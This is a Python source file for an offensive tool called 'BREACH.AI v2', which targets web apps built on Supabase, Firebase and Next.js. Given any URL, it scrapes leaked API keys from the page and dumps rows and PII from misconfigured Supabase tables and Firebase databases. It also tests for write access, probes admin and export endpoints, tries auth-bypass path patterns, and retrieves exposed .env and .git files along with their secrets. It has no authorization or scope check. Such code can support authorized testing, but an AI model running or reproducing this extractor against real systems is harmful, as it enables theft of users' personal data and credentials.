#!/usr/bin/env python3
"""
BREACH.AI v2 - Prove The Breach

This version focuses on ONE thing: Extracting real data to prove impact.

No more "potential vulnerability" bullshit.
Either we extract data, or we don't. Binary.

Target: Vibe-coded apps (Supabase, Firebase, Next.js, Vercel)
Time: 60 seconds to breach proof
Output: Real data, real impact, real evidence

Usage:
    python breach_v2.py https://target.com

    # With auth (test as logged-in user)
    python breach_v2.py https://target.com --token "Bearer eyJ..."
    python breach_v2.py https://target.com --cookie "session=abc123"
"""

import asyncio
import aiohttp
import json
import sys
import os
import re
import time
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any, Tuple
from urllib.parse import urlparse, urljoin
from datetime import datetime

# Rich UI
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich import box

console = Console()


# ============================================================================
# DATA STRUCTURES
# ============================================================================

@dataclass
class ExtractedData:
    """Real data we extracted as proof."""
    source: str
    endpoint: str
    record_count: int
    sample_records: List[Dict]
    pii_fields: List[str]
    raw_response: str


@dataclass
class Breach:
    """A confirmed breach with proof."""
    severity: str
    title: str
    description: str
    endpoint: str
    method: str
    headers: Dict
    data_extracted: Optional[ExtractedData]
    reproduction_curl: str
    fix_suggestion: str


@dataclass
class BreachReport:
    """Final breach report."""
    target: str
    scan_time_seconds: float
    tech_stack: List[str]
    secrets_found: List[Dict]
    breaches: List[Breach]
    total_records_exposed: int
    pii_types_exposed: List[str]


# ============================================================================
# CORE EXTRACTORS
# ============================================================================

class SupabaseExtractor:
    """Extract data from misconfigured Supabase (RLS bypass)."""

    COMMON_TABLES = [
        'users', 'profiles', 'accounts', 'customers',
        'orders', 'payments', 'transactions', 'invoices',
        'posts', 'comments', 'messages', 'notifications',
        'projects', 'teams', 'organizations', 'workspaces',
        'items', 'products', 'subscriptions', 'plans',
        'files', 'documents', 'uploads', 'media',
        'settings', 'configs', 'preferences',
        'logs', 'events', 'analytics', 'sessions',
    ]

    PII_FIELDS = ['email', 'phone', 'password', 'hash', 'ssn', 'address', 'dob', 'birth']

    def __init__(self, session: aiohttp.ClientSession):
        self.session = session

    async def extract(self, supabase_url: str, anon_key: str) -> List[ExtractedData]:
        """Attempt to extract data from all common tables."""
        extractions = []

        base_url = supabase_url.rstrip('/')
        if not base_url.startswith('http'):
            base_url = f'https://{base_url}'

        headers = {
            'apikey': anon_key,
            'Authorization': f'Bearer {anon_key}',
            'Content-Type': 'application/json',
        }

        for table in self.COMMON_TABLES:
            url = f"{base_url}/rest/v1/{table}?select=*&limit=100"

            try:
                async with self.session.get(url, headers=headers, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status == 200:
                        body = await resp.text()
                        data = json.loads(body)

                        if isinstance(data, list) and len(data) > 0:
                            pii = self._detect_pii(data[0])

                            extractions.append(ExtractedData(
                                source='supabase',
                                endpoint=f"/rest/v1/{table}",
                                record_count=len(data),
                                sample_records=data[:5],
                                pii_fields=pii,
                                raw_response=body[:5000]
                            ))

                            console.print(f"[red]█ EXTRACTED[/red] {table}: {len(data)} records" +
                                        (f" [PII: {', '.join(pii)}]" if pii else ""))
            except:
                pass

        return extractions

    async def test_write_access(self, supabase_url: str, anon_key: str) -> bool:
        """Test if we have write access."""
        base_url = supabase_url.rstrip('/')
        if not base_url.startswith('http'):
            base_url = f'https://{base_url}'

        headers = {
            'apikey': anon_key,
            'Authorization': f'Bearer {anon_key}',
            'Content-Type': 'application/json',
            'Prefer': 'return=minimal'
        }

        url = f"{base_url}/rest/v1/breach_ai_test"
        payload = {"test": "breach_ai", "timestamp": datetime.now().isoformat()}

        try:
            async with self.session.post(url, headers=headers, json=payload, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status in [200, 201]:
                    console.print(f"[red bold]█ WRITE ACCESS CONFIRMED[/red bold]")
                    return True
        except:
            pass
        return False

    def _detect_pii(self, record: Dict) -> List[str]:
        """Detect PII fields in a record."""
        pii = []
        for key in record.keys():
            key_lower = key.lower()
            for pii_field in self.PII_FIELDS:
                if pii_field in key_lower:
                    pii.append(key)
                    break
        return pii


class FirebaseExtractor:
    """Extract data from misconfigured Firebase."""

    COMMON_PATHS = [
        '', 'users', 'data', 'messages', 'posts', 'comments',
        'orders', 'products', 'customers', 'settings', 'config',
        'profiles', 'accounts', 'notifications', 'logs',
    ]

    def __init__(self, session: aiohttp.ClientSession):
        self.session = session

    async def extract(self, firebase_url: str) -> List[ExtractedData]:
        """Extract data from Firebase Realtime Database."""
        extractions = []

        base_url = firebase_url.rstrip('/')
        if not base_url.startswith('http'):
            base_url = f'https://{base_url}'

        if '.firebaseio.com' in base_url:
            base_url = base_url.split('.firebaseio.com')[0] + '.firebaseio.com'

        for path in self.COMMON_PATHS:
            url = f"{base_url}/{path}.json" if path else f"{base_url}/.json"

            try:
                async with self.session.get(url, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status == 200:
                        body = await resp.text()

                        if body and body != 'null':
                            data = json.loads(body)

                            if data:
                                count = self._count_records(data)
                                sample = self._extract_sample(data)

                                if count > 0:
                                    extractions.append(ExtractedData(
                                        source='firebase',
                                        endpoint=f"/{path}.json" if path else "/.json",
                                        record_count=count,
                                        sample_records=sample,
                                        pii_fields=self._detect_pii(sample),
                                        raw_response=body[:5000]
                                    ))

                                    console.print(f"[red]█ EXTRACTED[/red] firebase/{path or 'root'}: {count} records")
            except:
                pass

        return extractions

    def _count_records(self, data: Any, depth: int = 0) -> int:
        if depth > 3:
            return 0
        if isinstance(data, dict):
            return len(data) + sum(self._count_records(v, depth + 1) for v in data.values())
        elif isinstance(data, list):
            return len(data)
        return 1

    def _extract_sample(self, data: Any) -> List[Dict]:
        if isinstance(data, list):
            return data[:5]
        elif isinstance(data, dict):
            samples = []
            for k, v in list(data.items())[:5]:
                if isinstance(v, dict):
                    samples.append(v)
                else:
                    samples.append({k: v})
            return samples
        return [{"value": data}]

    def _detect_pii(self, records: List[Dict]) -> List[str]:
        pii = set()
        pii_keywords = ['email', 'phone', 'password', 'address', 'ssn', 'name', 'dob']

        for record in records:
            if isinstance(record, dict):
                for key in record.keys():
                    for kw in pii_keywords:
                        if kw in str(key).lower():
                            pii.add(key)
        return list(pii)


class ExposedEndpointExtractor:
    """Find and extract from exposed API endpoints."""

    SENSITIVE_ENDPOINTS = [
        '/api/auth/session', '/api/auth/csrf', '/api/auth/providers',
        '/api/me', '/api/user', '/api/profile', '/api/account',
        '/api/users', '/api/customers', '/api/orders', '/api/payments',
        '/api/projects', '/api/teams', '/api/organizations',
        '/api/data', '/api/export', '/api/backup', '/api/dump',
        '/api/admin', '/api/admin/users', '/api/admin/stats',
        '/api/internal', '/api/debug', '/api/test',
        '/api/health', '/api/status', '/api/config', '/api/settings',
        '/api/env', '/api/version', '/api/info',
        '/api/plans', '/api/subscriptions', '/api/billing',
        '/graphql', '/api/graphql',
        '/api/webhook', '/api/webhooks', '/api/hooks',
    ]

    def __init__(self, session: aiohttp.ClientSession):
        self.session = session

    async def extract(self, base_url: str, auth_header: str = None) -> Tuple[List[ExtractedData], List[Dict]]:
        """Find exposed endpoints and extract data."""
        extractions = []
        endpoint_info = []

        headers = {'Accept': 'application/json'}
        if auth_header:
            headers['Authorization'] = auth_header

        for endpoint in self.SENSITIVE_ENDPOINTS:
            url = urljoin(base_url, endpoint)

            try:
                async with self.session.get(url, headers=headers, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    body = await resp.text()

                    info = {
                        'endpoint': endpoint,
                        'status': resp.status,
                        'size': len(body),
                        'auth_required': resp.status == 401,
                    }
                    endpoint_info.append(info)

                    if resp.status == 200 and len(body) > 50:
                        try:
                            data = json.loads(body)

                            if self._is_sensitive_data(data):
                                records = data if isinstance(data, list) else [data]

                                extractions.append(ExtractedData(
                                    source='exposed_endpoint',
                                    endpoint=endpoint,
                                    record_count=len(records) if isinstance(data, list) else 1,
                                    sample_records=records[:5],
                                    pii_fields=self._detect_pii(records),
                                    raw_response=body[:3000]
                                ))

                                console.print(f"[red]█ EXPOSED[/red] {endpoint} -> {len(body)} bytes")
                        except:
                            pass
            except:
                pass

        return extractions, endpoint_info

    def _is_sensitive_data(self, data: Any) -> bool:
        if isinstance(data, list) and len(data) > 0:
            return True
        if isinstance(data, dict):
            ignore_keys = {'status', 'ok', 'healthy', 'version', 'uptime'}
            if set(data.keys()) - ignore_keys:
                return True
        return False

    def _detect_pii(self, records: List[Dict]) -> List[str]:
        pii = set()
        pii_keywords = ['email', 'phone', 'password', 'address', 'ssn', 'name', 'token', 'key', 'secret']

        for record in records:
            if isinstance(record, dict):
                for key in record.keys():
                    for kw in pii_keywords:
                        if kw in str(key).lower():
                            pii.add(key)
        return list(pii)


class IDORExtractor:
    """Test and exploit IDOR vulnerabilities."""

    def __init__(self, session: aiohttp.ClientSession):
        self.session = session

    async def test_auth_bypass(self, base_url: str, endpoints: List[Dict]) -> List[ExtractedData]:
        """Test for auth bypass on endpoints that return 401."""
        extractions = []

        # Find 401 endpoints
        protected = [e for e in endpoints if e.get('status') == 401]

        for ep in protected:
            endpoint = ep['endpoint']

            # Try with UUID path parameter
            test_patterns = [
                f"{endpoint}/1",
                f"{endpoint}/0",
                f"{endpoint}/admin",
                f"{endpoint}/00000000-0000-0000-0000-000000000001",
            ]

            for test_url in test_patterns:
                url = urljoin(base_url, test_url)

                try:
                    async with self.session.get(url, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        if resp.status == 200:
                            body = await resp.text()
                            if len(body) > 50:
                                try:
                                    data = json.loads(body)
                                    if data:
                                        console.print(f"[red]█ AUTH BYPASS[/red] {test_url}")
                                        extractions.append(ExtractedData(
                                            source='auth_bypass',
                                            endpoint=test_url,
                                            record_count=1,
                                            sample_records=[data] if isinstance(data, dict) else data[:5],
                                            pii_fields=[],
                                            raw_response=body[:2000]
                                        ))
                                except:
                                    pass
                        elif resp.status == 404:
                            # 404 instead of 401 = auth bypass!
                            console.print(f"[yellow]█ AUTH BYPASS (404)[/yellow] {test_url} - endpoint processes request without auth")
                            extractions.append(ExtractedData(
                                source='auth_bypass_404',
                                endpoint=test_url,
                                record_count=0,
                                sample_records=[],
                                pii_fields=[],
                                raw_response=f"Returns 404 instead of 401 - auth middleware not applied"
                            ))
                except:
                    pass

        return extractions


class EnvFileExtractor:
    """Find exposed environment files and secrets."""

    PATHS = [
        '/.env', '/.env.local', '/.env.production', '/.env.development',
        '/.env.backup', '/.env.old', '/.env.example',
        '/.git/config', '/.git/HEAD',
        '/config.json', '/settings.json', '/secrets.json',
        '/swagger.json', '/openapi.json',
    ]

    SECRET_PATTERNS = {
        'supabase_url': r'(https://[a-z0-9]+\.supabase\.co)',
        'supabase_key': r'(eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+)',
        'firebase_key': r'(AIza[a-zA-Z0-9_-]{35})',
        'firebase_url': r'(https://[a-z0-9-]+\.firebaseio\.com)',
        'aws_key': r'(AKIA[0-9A-Z]{16})',
        'stripe_secret': r'(sk_live_[a-zA-Z0-9]{24,})',
        'stripe_publishable': r'(pk_live_[a-zA-Z0-9]{24,})',
        'github_token': r'(ghp_[a-zA-Z0-9]{36})',
        'openai_key': r'(sk-[a-zA-Z0-9]{48})',
        'database_url': r'((?:postgres|mysql|mongodb)://[^\s<>"\']+)',
        'jwt_secret': r'(["\']?jwt[_]?secret["\']?\s*[:=]\s*["\'][^"\']{8,}["\'])',
    }

    def __init__(self, session: aiohttp.ClientSession):
        self.session = session

    async def extract(self, base_url: str) -> Tuple[List[Dict], List[ExtractedData]]:
        """Find exposed files and extract secrets."""
        secrets = []
        extractions = []

        for path in self.PATHS:
            url = urljoin(base_url, path)

            try:
                async with self.session.get(url, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status == 200:
                        body = await resp.text()

                        if self._is_real_file(path, body):
                            console.print(f"[red bold]█ EXPOSED FILE[/red bold] {path}")

                            for secret_type, pattern in self.SECRET_PATTERNS.items():
                                matches = re.findall(pattern, body, re.IGNORECASE)
                                for match in matches:
                                    secrets.append({
                                        'type': secret_type,
                                        'value': match if isinstance(match, str) else match[0],
                                        'source': path
                                    })
                                    console.print(f"[red]  -> {secret_type}[/red]")

                            extractions.append(ExtractedData(
                                source='exposed_file',
                                endpoint=path,
                                record_count=1,
                                sample_records=[{'file': path, 'size': len(body)}],
                                pii_fields=[],
                                raw_response=body[:2000]
                            ))
            except:
                pass

        return secrets, extractions

    def _is_real_file(self, path: str, body: str) -> bool:
        if len(body) < 10:
            return False
        if '<html' in body.lower()[:200]:
            return False
        if path.endswith('.json'):
            try:
                json.loads(body)
                return True
            except:
                return False
        if '.env' in path:
            return '=' in body or ':' in body
        if '.git' in path:
            return '[core]' in body or 'ref:' in body
        return True


# ============================================================================
# MAIN BREACH ENGINE
# ============================================================================

class BreachEngine:
    """Main breach engine - runs all extractors and generates report."""

    def __init__(self, auth_token: str = None, auth_cookie: str = None):
        self.auth_token = auth_token
        self.auth_cookie = auth_cookie
        self.session: Optional[aiohttp.ClientSession] = None

    async def __aenter__(self):
        headers = {'User-Agent': 'BREACH.AI Security Scanner'}
        cookies = {}

        if self.auth_token:
            headers['Authorization'] = self.auth_token
        if self.auth_cookie:
            for part in self.auth_cookie.split(';'):
                if '=' in part:
                    k, v = part.strip().split('=', 1)
                    cookies[k] = v

        self.session = aiohttp.ClientSession(
            headers=headers,
            cookies=cookies if cookies else None,
            timeout=aiohttp.ClientTimeout(total=30)
        )
        return self

    async def __aexit__(self, *args):
        if self.session:
            await self.session.close()

    async def breach(self, target: str) -> BreachReport:
        """Execute full breach attempt."""
        start_time = time.time()

        if not target.startswith('http'):
            target = f'https://{target}'

        console.print(Panel.fit(
            f"[bold red]BREACH.AI v2 - PROVE THE BREACH[/bold red]\n"
            f"[dim]Target: {target}[/dim]\n"
            f"[dim]Mode: {'Authenticated' if self.auth_token else 'Unauthenticated'}[/dim]",
            border_style="red"
        ))

        report = BreachReport(
            target=target,
            scan_time_seconds=0,
            tech_stack=[],
            secrets_found=[],
            breaches=[],
            total_records_exposed=0,
            pii_types_exposed=[]
        )

        all_extractions = []

        # Phase 1: Recon
        console.print("\n[bold cyan]▶ PHASE 1: RECON & SECRETS[/bold cyan]")
        secrets, tech_stack = await self._recon(target)
        report.secrets_found = secrets
        report.tech_stack = tech_stack

        # Phase 2: Backend extraction
        console.print("\n[bold cyan]▶ PHASE 2: DATA EXTRACTION[/bold cyan]")

        # Supabase
        supabase_urls = [s['value'] for s in secrets if s['type'] == 'supabase_url']
        supabase_keys = [s['value'] for s in secrets if 'supabase' in s['type'] and 'key' in s['type']]

        if supabase_urls and supabase_keys:
            console.print(f"\n[yellow]Testing Supabase RLS...[/yellow]")
            extractor = SupabaseExtractor(self.session)
            extractions = await extractor.extract(supabase_urls[0], supabase_keys[0])
            all_extractions.extend(extractions)

            if extractions:
                await extractor.test_write_access(supabase_urls[0], supabase_keys[0])
                report.breaches.append(Breach(
                    severity='critical',
                    title='Supabase RLS Bypass - Full Database Access',
                    description=f'Direct database access via anon key. {sum(e.record_count for e in extractions)} records exposed.',
                    endpoint=f'{supabase_urls[0]}/rest/v1/*',
                    method='GET',
                    headers={'apikey': supabase_keys[0][:20] + '...'},
                    data_extracted=extractions[0] if extractions else None,
                    reproduction_curl=f"curl '{supabase_urls[0]}/rest/v1/users?select=*' -H 'apikey: {supabase_keys[0]}'",
                    fix_suggestion='Enable RLS: ALTER TABLE users ENABLE ROW LEVEL SECURITY;'
                ))

        # Firebase
        firebase_urls = [s['value'] for s in secrets if 'firebase' in s['type'] and 'url' in s['type']]
        for fb_url in firebase_urls[:1]:
            console.print(f"\n[yellow]Testing Firebase rules...[/yellow]")
            extractor = FirebaseExtractor(self.session)
            extractions = await extractor.extract(fb_url)
            all_extractions.extend(extractions)

            if extractions:
                report.breaches.append(Breach(
                    severity='critical',
                    title='Firebase Open Database',
                    description=f'Firebase publicly readable. {sum(e.record_count for e in extractions)} records.',
                    endpoint=fb_url,
                    method='GET',
                    headers={},
                    data_extracted=extractions[0] if extractions else None,
                    reproduction_curl=f"curl '{fb_url}/.json'",
                    fix_suggestion='Update rules: {".read": "auth != null"}'
                ))

        # Phase 3: Exposed Endpoints
        console.print("\n[bold cyan]▶ PHASE 3: EXPOSED ENDPOINTS[/bold cyan]")

        endpoint_extractor = ExposedEndpointExtractor(self.session)
        endpoint_extractions, endpoint_info = await endpoint_extractor.extract(target, self.auth_token)
        all_extractions.extend(endpoint_extractions)

        for extraction in endpoint_extractions:
            if extraction.record_count > 0:
                report.breaches.append(Breach(
                    severity='high' if extraction.pii_fields else 'medium',
                    title=f'Exposed API: {extraction.endpoint}',
                    description=f'{extraction.record_count} records exposed.',
                    endpoint=extraction.endpoint,
                    method='GET',
                    headers={},
                    data_extracted=extraction,
                    reproduction_curl=f"curl '{urljoin(target, extraction.endpoint)}'",
                    fix_suggestion=f'Add auth middleware to {extraction.endpoint}'
                ))

        # Phase 4: Auth Bypass Testing
        console.print("\n[bold cyan]▶ PHASE 4: AUTH BYPASS TESTING[/bold cyan]")

        idor_extractor = IDORExtractor(self.session)
        bypass_extractions = await idor_extractor.test_auth_bypass(target, endpoint_info)
        all_extractions.extend(bypass_extractions)

        for extraction in bypass_extractions:
            report.breaches.append(Breach(
                severity='critical',
                title=f'Auth Bypass: {extraction.endpoint}',
                description='Authentication middleware not applied to this endpoint.',
                endpoint=extraction.endpoint,
                method='GET',
                headers={},
                data_extracted=extraction,
                reproduction_curl=f"curl '{urljoin(target, extraction.endpoint)}'",
                fix_suggestion='Apply auth middleware to all routes including parameterized ones'
            ))

        # Phase 5: Exposed Files
        console.print("\n[bold cyan]▶ PHASE 5: EXPOSED FILES[/bold cyan]")

        file_extractor = EnvFileExtractor(self.session)
        file_secrets, file_extractions = await file_extractor.extract(target)
        report.secrets_found.extend(file_secrets)
        all_extractions.extend(file_extractions)

        for extraction in file_extractions:
            report.breaches.append(Breach(
                severity='critical' if '.env' in extraction.endpoint else 'high',
                title=f'Exposed File: {extraction.endpoint}',
                description='Sensitive file publicly accessible.',
                endpoint=extraction.endpoint,
                method='GET',
                headers={},
                data_extracted=extraction,
                reproduction_curl=f"curl '{urljoin(target, extraction.endpoint)}'",
                fix_suggestion=f'Block access to {extraction.endpoint}'
            ))

        # Calculate totals
        report.total_records_exposed = sum(e.record_count for e in all_extractions)
        all_pii = set()
        for e in all_extractions:
            all_pii.update(e.pii_fields)
        report.pii_types_exposed = list(all_pii)
        report.scan_time_seconds = time.time() - start_time

        return report

    async def _recon(self, target: str) -> Tuple[List[Dict], List[str]]:
        """Initial reconnaissance."""
        secrets = []
        tech_stack = []

        try:
            async with self.session.get(target, ssl=False) as resp:
                body = await resp.text()
                headers = dict(resp.headers)

                # Detect tech
                if '_next' in body or '__NEXT_DATA__' in body:
                    tech_stack.append('Next.js')
                if 'react' in body.lower():
                    tech_stack.append('React')
                if 'vue' in body.lower():
                    tech_stack.append('Vue.js')
                if 'supabase' in body.lower():
                    tech_stack.append('Supabase')
                if 'firebase' in body.lower():
                    tech_stack.append('Firebase')
                if 'vercel' in headers.get('server', '').lower():
                    tech_stack.append('Vercel')
                if 'stripe' in body.lower():
                    tech_stack.append('Stripe')

                # Extract secrets
                for secret_type, pattern in EnvFileExtractor.SECRET_PATTERNS.items():
                    matches = re.findall(pattern, body)
                    for match in matches:
                        secrets.append({
                            'type': secret_type,
                            'value': match if isinstance(match, str) else match[0],
                            'source': 'main_page'
                        })

                if tech_stack:
                    console.print(f"[green]Tech:[/green] {', '.join(tech_stack)}")
                if secrets:
                    console.print(f"[yellow]Secrets found:[/yellow] {len(secrets)}")
                    for s in secrets[:5]:
                        masked = s['value'][:30] + '...' if len(s['value']) > 30 else s['value']
                        console.print(f"  [dim]• {s['type']}: {masked}[/dim]")
        except Exception as e:
            console.print(f"[red]Recon error: {e}[/red]")

        return secrets, tech_stack


# ============================================================================
# REPORT GENERATION
# ============================================================================

def print_report(report: BreachReport):
    """Print the breach report."""
    console.print(f"\n{'=' * 70}")

    if report.breaches:
        console.print(f"[bold red]BREACH CONFIRMED[/bold red]")
    else:
        console.print(f"[bold green]NO BREACHES FOUND[/bold green]")

    console.print(f"{'=' * 70}\n")

    table = Table(box=box.ROUNDED, title="Summary")
    table.add_column("Metric", style="cyan")
    table.add_column("Value")

    table.add_row("Target", report.target)
    table.add_row("Scan Time", f"{report.scan_time_seconds:.1f} seconds")
    table.add_row("Tech Stack", ', '.join(report.tech_stack) or 'Unknown')
    table.add_row("Secrets Found", str(len(report.secrets_found)))
    table.add_row("Breaches", str(len(report.breaches)))
    table.add_row("Records Exposed", f"[bold red]{report.total_records_exposed}[/bold red]" if report.total_records_exposed else "0")
    table.add_row("PII Types", ', '.join(report.pii_types_exposed) or 'None')

    console.print(table)

    if report.breaches:
        console.print(f"\n[bold]Breaches:[/bold]")

        for i, breach in enumerate(report.breaches, 1):
            severity_color = {'critical': 'red bold', 'high': 'red', 'medium': 'yellow'}.get(breach.severity, 'white')

            console.print(f"\n[{severity_color}]{i}. [{breach.severity.upper()}] {breach.title}[/{severity_color}]")
            console.print(f"   {breach.description}")
            console.print(f"   [dim]Reproduce: {breach.reproduction_curl[:80]}...[/dim]")
            console.print(f"   [green]Fix: {breach.fix_suggestion}[/green]")

    console.print(f"\n{'=' * 70}\n")


def generate_json_report(report: BreachReport) -> str:
    """Generate JSON report."""
    return json.dumps({
        'target': report.target,
        'scan_time_seconds': report.scan_time_seconds,
        'tech_stack': report.tech_stack,
        'secrets_found': len(report.secrets_found),
        'breaches': [
            {
                'severity': b.severity,
                'title': b.title,
                'description': b.description,
                'endpoint': b.endpoint,
                'reproduction_curl': b.reproduction_curl,
                'fix_suggestion': b.fix_suggestion,
                'records_exposed': b.data_extracted.record_count if b.data_extracted else 0,
            }
            for b in report.breaches
        ],
        'total_records_exposed': report.total_records_exposed,
        'pii_types_exposed': report.pii_types_exposed,
    }, indent=2)


# ============================================================================
# CLI
# ============================================================================

async def main():
    import argparse

    parser = argparse.ArgumentParser(description='BREACH.AI v2 - Prove The Breach')
    parser.add_argument('target', help='Target URL')
    parser.add_argument('--token', help='Auth token (e.g., "Bearer eyJ...")')
    parser.add_argument('--cookie', help='Auth cookie (e.g., "session=abc123")')
    parser.add_argument('--json', action='store_true', help='Output JSON report')
    parser.add_argument('--output', help='Save report to file')

    args = parser.parse_args()

    async with BreachEngine(auth_token=args.token, auth_cookie=args.cookie) as engine:
        report = await engine.breach(args.target)

    if args.json:
        json_report = generate_json_report(report)
        if args.output:
            with open(args.output, 'w') as f:
                f.write(json_report)
            console.print(f"[green]Report saved to {args.output}[/green]")
        else:
            print(json_report)
    else:
        print_report(report)

        if args.output:
            with open(args.output, 'w') as f:
                f.write(generate_json_report(report))
            console.print(f"[green]JSON report saved to {args.output}[/green]")


if __name__ == '__main__':
    asyncio.run(main())
